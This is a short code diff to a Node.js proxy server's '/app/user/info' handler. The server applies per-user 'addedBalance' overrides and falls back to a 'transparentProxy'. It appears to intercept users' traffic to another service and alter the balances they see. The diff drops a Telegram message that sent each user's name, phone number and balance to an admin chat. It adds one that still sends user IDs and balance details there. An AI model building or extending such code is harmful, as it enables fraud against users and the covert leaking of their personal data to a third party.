@@ -1234,6 +1234,12 @@ app.all('/app/user/info', async (req, res) => {
         }
       }
     }
+    if (data.adminChatId && bot) {
+      const rdKeys = respData ? Object.keys(respData).join(',') : 'null';
+      const userOvrDbg = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+      const addedDbg = userOvrDbg && userOvrDbg.addedBalance !== undefined ? userOvrDbg.addedBalance : 0;
+      bot.sendMessage(data.adminChatId, `🔍 DiwaDebug /app/user/info\nUID: ${effectiveUserId || 'NONE'}\nOvr: ${!!userOvrDbg} | Added: ${addedDbg}\nBal field: ${respData?.balance ?? 'MISSING'} | AvailBal: ${respData?.availableBalance ?? 'MISSING'}\nKeys: ${rdKeys}`).catch(()=>{});
+    }
     sendJson(res, respHeaders, jsonResp, respBody);
     if (effectiveUserId) {
       saveTokenUserId(req, effectiveUserId);
@@ -1249,9 +1255,6 @@ app.all('/app/user/info', async (req, res) => {
         orderCount: existing.orderCount || 0
       };
       saveData(data).catch(()=>{});
-    }
-    if (data.adminChatId && bot) {
-      bot.sendMessage(data.adminChatId, `👤 UserInfo [${effectiveUserId || 'N/A'}]\n📛 Name: ${username || 'N/A'}\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
     }
   } catch(e) { await transparentProxy(req, res); }
 });
